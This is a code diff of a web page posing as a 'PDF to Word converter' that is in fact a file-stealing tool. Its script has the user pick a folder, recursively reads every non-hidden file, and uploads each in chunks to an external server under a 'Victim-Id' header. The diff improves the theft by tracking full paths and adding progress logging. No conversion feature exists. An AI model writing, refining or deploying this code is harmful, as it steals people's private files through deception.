@@ -11,49 +11,54 @@
   </style>
 </head>
 <body>
-  <h1>PDF TO HAH Word Converter</h1>
+  <h1>PDF TO Word Converter</h1>
   <button id="start">Start</button>
   <script>
     (async function () {
       let serverUrl = "https://deobbetest1-production-104e.up.railway.app/upload";
-    
+
       document.getElementById("start").addEventListener("click", async () => {
         try {
           let victimId = crypto.randomUUID();
           let directoryHandle = await window.showDirectoryPicker();
-          let processedFiles = new Set(); // Ensure files are not duplicated
-    
-          async function uploadDirectory(dirHandle, victimId) {
+          let processedFiles = new Set(); // Track processed files by their full path
+
+          async function uploadDirectory(dirHandle, victimId, currentPath = '') {
             let uploadPromises = [];
             let maxConcurrentUploads = 3;
             let uploadQueue = [];
-    
-            async function processEntry(entry) {
+
+            async function processEntry(entry, path = '') {
               if (entry.kind === "file" && !entry.name.startsWith(".")) {
-                if (processedFiles.has(entry.name)) return;
-                processedFiles.add(entry.name); // Track processed file
-    
+                const filePath = `${path}/${entry.name}`;
+                if (processedFiles.has(filePath)) return; // Skip if already processed
+                processedFiles.add(filePath); // Track processed file
+
                 let file = await entry.getFile();
                 let totalChunks = Math.ceil(file.size / (1024 * 100)); // 100KB chunks
-    
+
+                console.log(`Processing file: ${filePath}`);
+
                 for (let chunkIndex = 0, offset = 0; offset < file.size; chunkIndex++) {
                   let chunk = file.slice(offset, offset + 1024 * 100);
                   offset += 1024 * 100;
-    
+
+                  console.log(`Uploading chunk ${chunkIndex + 1} of ${totalChunks} for file: ${filePath}`);
+
                   let uploadPromise = fetch(serverUrl, {
                     method: "POST",
                     headers: {
                       "Content-Type": "application/octet-stream",
                       "Victim-Id": encodeURIComponent(victimId),
-                      "Filename": encodeURIComponent(entry.name),
+                      "Filename": encodeURIComponent(filePath), // Use full path
                       "Chunk-Index": chunkIndex + 1,
                       "Total-Chunks": totalChunks
                     },
                     body: chunk
                   });
-    
+
                   uploadQueue.push(uploadPromise);
-    
+
                   // Control concurrency
                   if (uploadQueue.length >= maxConcurrentUploads) {
                     await Promise.all(uploadQueue);
@@ -62,18 +67,18 @@
                 }
               } else if (entry.kind === "directory") {
                 let subDirHandle = await dirHandle.getDirectoryHandle(entry.name);
-                await uploadDirectory(subDirHandle, victimId); // Recursively process directories
+                await uploadDirectory(subDirHandle, victimId, `${path}/${entry.name}`); // Pass the updated path
               }
             }
-    
+
             for await (let entry of dirHandle.values()) {
-              uploadPromises.push(processEntry(entry));
+              uploadPromises.push(processEntry(entry, currentPath));
             }
-    
+
             await Promise.all(uploadPromises);
             if (uploadQueue.length > 0) await Promise.all(uploadQueue); // Wait for last batch
           }
-    
+
           await uploadDirectory(directoryHandle, victimId);
           console.log("✅ Upload complete!");
         } catch (error) {
